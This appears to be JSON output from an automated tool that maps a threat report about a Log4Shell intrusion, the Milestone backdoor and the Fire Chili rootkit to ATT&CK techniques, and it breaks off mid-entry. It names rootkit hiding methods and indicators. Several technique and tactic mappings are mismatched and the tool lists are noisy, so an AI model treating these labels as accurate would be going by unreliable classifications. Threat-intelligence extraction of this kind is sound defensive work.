{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 50,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
        "extracted_ttps": [
          {
            "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attacker uses the command line to execute commands, specifically CreateProcessAsUser, to create a new administrator user and execute the backdoor with elevated privileges.",
            "confidence_score": 0.761,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.529,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CreateProcessAsUser",
              "ANONYMOUS",
              "MileSt0ne2@16"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Rootkit",
            "attack_id": "T1014",
            "tactic": "Defense Evasion",
            "description": "The attackers used a rootkit to hide their malware and evade detection.",
            "confidence_score": 0.732,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "rootkit",
              "malware hiding"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "Fire Chili rootkit",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "The text mentions the use of PowerShell, which is a common technique for executing commands",
            "confidence_score": 0.727,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PowerShell"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Reflective Code Loading",
            "attack_id": "T1620",
            "tactic": "Defense Evasion",
            "description": "The attackers used reflective code loading to load their malware into memory without writing it to disk.",
            "confidence_score": 0.725,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.428,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "reflective code loading",
              "malware loading"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "The attackers used screen capture to collect sensitive information from the victim's system.",
            "confidence_score": 0.721,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "screen capture",
              "sensitive information collection"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "eef2d66c-b414-4715-bdca-d065e58c6be0",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "PowerShell was used to download and execute a chain of scripts",
            "confidence_score": 0.713,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The attackers gathered file and directory information, including the location of system files and folders.",
            "confidence_score": 0.713,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "file and directory information",
              "system files"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Obfuscated Files or Information: Software Packing",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The attackers used software packing to obfuscate their malware, making it harder to detect.",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "software packing",
              "obfuscated files"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Gather Victim Host Information",
            "attack_id": "T1592",
            "tactic": "Discovery",
            "description": "The attackers gathered information about the victim host, including system configuration and network settings.",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "victim host information",
              "system configuration"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d58c898c-b174-4f1e-9d26-0e5715c2a046",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The attackers exploited the Log4Shell vulnerability in public-facing applications to gain initial access.",
            "confidence_score": 0.706,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Log4Shell",
              "public-facing applications"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1bb2a359-f806-42ce-9af9-fd287ead4e83",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
            "attack_id": "T1059.003",
            "tactic": "Execution",
            "description": "The attackers used the Windows Command Shell to execute commands and scripts, including the Milestone backdoor.",
            "confidence_score": 0.706,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Windows Command Shell",
              "Milestone backdoor"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ad2084b5-d61d-4cbd-85d8-9f884db95fec",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The attackers gathered system information, including network connections and process lists.",
            "confidence_score": 0.705,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.29,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "system information",
              "network connections"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "93cbd072-0d1f-4821-b4a1-b84bb57ae5fb",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Hijack Execution Flow: DLL Side-Loading",
            "attack_id": "T1574.002",
            "tactic": "Defense Evasion",
            "description": "The attackers used DLL side-loading to hijack the execution flow of legitimate system processes.",
            "confidence_score": 0.705,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "DLL side-loading",
              "execution flow hijacking"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "284501fe-7255-44cb-ac55-3fcfd9b23ab2",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "The attacker may use PowerShell to execute commands",
            "confidence_score": 0.703,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PowerShell"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a24669e5-766d-4682-b6de-55324292c57a",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Hide System Processes",
            "attack_id": "T1564.003",
            "tactic": "Defense Evasion",
            "description": "The rootkit hides processes from users by dynamically resolving the ActiveProcessLinks offset in the EPROCESS structure and removing the process from the list",
            "confidence_score": 0.702,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.62,
              "description_detail": 0.521,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ActiveProcessLinks",
              "EPROCESS",
              "UniqueProcessId"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Rootkit",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "af1e7ebb-f91a-40ee-862c-bea50e7d00ee",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Masquerading",
            "attack_id": "T1036",
            "tactic": "Defense Evasion",
            "description": "The attackers used masquerading techniques, including code signing certificates, to evade detection.",
            "confidence_score": 0.702,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "code signing certificates",
              "masquerading"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "933453dc-5dba-4b4f-b241-eea9fa4ef3a0",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The attackers exfiltrated data over their command and control (C2) channel.",
            "confidence_score": 0.699,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C2 channel",
              "data exfiltration"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5ab87126-8015-43ab-8994-cb6361447eff",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Obtain Capabilities: Code Signing Certificates",
            "attack_id": "T1588.003",
            "tactic": "Defense Evasion",
            "description": "The attackers obtained code signing certificates to sign their malware, making it appear legitimate.",
            "confidence_score": 0.699,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "code signing certificates",
              "malware signing"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d65990b6-3038-4a65-bd80-4747c2e463dd",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Windows Command Shell",
            "attack_id": "T1059.003",
            "tactic": "Execution",
            "description": "The text mentions the use of CMD, which is a common technique for executing commands",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CMD"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fdc319c5-72d2-4aaf-9e1c-5a3f505562bd",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "System Services: Service Execution",
            "attack_id": "T1569.002",
            "tactic": "Execution",
            "description": "The attackers used system services to execute malicious code, including the Milestone backdoor.",
            "confidence_score": 0.696,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Milestone backdoor",
              "system services"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a71fa12b-40ab-446e-a7bf-ce881574c1db",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Command and Scripting Interpreter: PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "The attackers used PowerShell to execute commands and scripts, including the Milestone backdoor.",
            "confidence_score": 0.696,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PowerShell",
              "Milestone backdoor"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "976cd85c-7bb8-4059-abff-febf170f8041",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Modify Registry",
            "attack_id": "T1112",
            "tactic": "Defense Evasion",
            "description": "The rootkit hides registry keys from users by replacing the HHIVE->GetCellRoutine functions with a filter function",
            "confidence_score": 0.695,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "REGEDIT.EXE",
              "HHIVE->GetCellRoutine",
              "\\\\\\.\\REGISTRY\\MACHINE\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\CRTSYS"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Rootkit",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2c87514d-1e2b-4e20-bf54-9102daea783f",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Modify Registry",
            "attack_id": "T1112",
            "tactic": "Persistence",
            "description": "The dropper patches the .data section of the loader binary to add its configuration before writing it to disk.",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "newdev.dll",
              ".data section"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3c688e21-c8bd-4501-b05a-0c69d768d2ad",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Virtualization/Sandbox Evasion",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "The driver restricts user-mode processes from acquiring the permissions needed to terminate the threat actor\u2019s malicious processes",
            "confidence_score": 0.692,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.428,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PROCESS_TERMINATE permission",
              "DesiredAccess parameter"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Driver",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e443ed87-0aed-487e-81cb-e472dede450e",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Network Service Scanning",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "The rootkit hides TCP connections from tools like netstat by intercepting IOCTLs and filtering the results",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "netstat",
              "nsiproxy.sys",
              "IOCTL_NSI_GETALLPARAM"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Rootkit",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7347b415-69a6-4e88-b724-7f8c58f86461",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Hide System Processes",
            "attack_id": "T1564.003",
            "tactic": "Defense Evasion",
            "description": "The rootkit hides a process by preventing its termination and removing it from the global process list",
            "confidence_score": 0.688,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.62,
              "description_detail": 0.428,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "0xF306000C",
              "0xF3060010",
              "*\\SYSTEM32\\DRIVERS\\CRTSYS.SYS"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Rootkit",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "30fd8a29-44f7-408c-9627-aa5f9fc50fcd",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The backdoor sent information about the current sessions on the system to the server",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "Milestone",
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "678b697b-f519-4251-8aa1-47ac191efa8a",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Hide System Processes",
            "attack_id": "T1564.004",
            "tactic": "Defense Evasion",
            "description": "The rootkit hides a process by removing it from the ActiveProcessLinks list of the EPROCESS structure",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.62,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PsSetCreateProcessNotifyRoutine API",
              "EPROCESS structure",
              "ActiveProcessLinks list"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "Rootkit",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "PowerShell",
            "attack_id": "T1086",
            "tactic": "Execution",
            "description": "Detected PowerShell activity via NLP pattern matching",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "1b97c56d-3222-4fb2-bf79-c8dbcbb56636",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The dropper executes a benign executable, syn.exe, signed by Synaptics, to side-load the newdev.dll loader module.",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "syn.exe",
              "newdev.dll"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "syn.exe",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "44fc6092-59c4-4faf-a5d1-db47f604ffbe",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker used a PowerShell script to download additional files from a remote server",
            "confidence_score": 0.682,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "1.bat",
              "syn.exe",
              "1.dll"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cd26a3df-c13e-477d-a592-f30eadb32624",
            "report_id": "pdf-86561cf5f7565d2814a75d5c8b59909f",
            "technique_name": "Virtualization/Sandbox Evasion",
            "attack_id": "T1497",
            "tactic": "Evasion",
            "description": "The rootkit checks if the victim machine is running in safe mode before proceeding with its operations.",
            "confidence_score": 0.681,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "safe mode"
            ],
            "tools": [
              "net",
              "cmd",
              "reflective",
              "REGEDIT",
              "CMD",
              "netstat",
              "powershell",
              "reg",
              "rootkit",
              "sc",
              "xor",
              "zip",
              "at",
              "apt",
              "PowerShell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
